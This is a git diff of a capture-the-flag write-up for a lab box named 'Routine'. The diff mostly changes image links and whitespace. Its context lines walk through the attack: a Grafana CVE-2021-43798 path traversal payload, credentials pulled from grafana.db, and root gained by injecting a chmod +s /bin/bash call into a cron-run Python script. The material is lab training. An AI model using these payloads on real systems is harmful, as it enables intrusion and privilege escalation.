@@ -1,9 +1,8 @@
-# Routine Series (Medium)
+# Routine
 
 ## Routine - I
 
 This box is vulnerable, and uses a mysql plugin.
-
 
 Nmap Scan
 
@@ -24,7 +23,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.36 seconds
 
 SSH and HTTP open. HTTP had a Grafana login page
 
-![](images/image-7.png)
+<img src="../../.gitbook/assets/image-7 (1).png" alt="" width="563">
 
 Did some fuzzing with `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.1.121:3000/FUZZ -fs 29`
 
@@ -42,7 +41,6 @@ signup                  [Status: 200, Size: 27985, Words: 1924, Lines: 192, Dura
 
 The footer of the login page revealed the it was Grafana v8.3.0 (914fcedb72), which after searching around had a path traversal CVE (https://sahruldotid.medium.com/understanding-grafana-unauthenticated-path-travesal-cve-2021-43798-508182d08bca)
 
-
 `public/plugins/graph/../../../../../../../../etc/passwd` dumps the /etc/passwd
 
 I maanged to get the grafana.db with this command:
@@ -51,11 +49,11 @@ I maanged to get the grafana.db with this command:
 
 In the db, we get some creds:
 
-![](images/image-8.png)
+![](<../../.gitbook/assets/image-8 (1).png>)
 
 After trying the credentials with SSH, I finally get a hit with `tellytubby:V4lor4nt-Anti-cHEAT`
 
-First Flag: 
+First Flag:
 
 ```
 tellytubby@routine:~$ ls
@@ -105,7 +103,7 @@ for user in users:
 
 There are a bunch of backups in the dir mentioned in the script. However, we can;t access any of them:
 
-![](images/image-9.png)
+![](<../../.gitbook/assets/image-9 (1).png>)
 
 In the comments, it mentioned that this script in called by `backup.sh` . I found the script in `/opt`
 
@@ -148,6 +146,7 @@ The backup script is run by root every minute and that script calls the `userbac
 import os
 os.system("chmod +s /bin/bash")
 ```
+
 Waited for a minute and then ran `bash -p`. Gained root!
 
 ```
@@ -161,7 +160,3 @@ bash-5.3# cat proof.txt
 OWASPKL{b0f8c51049b9db31552bda1bd751940a}
 
 ```
-
-
-
-
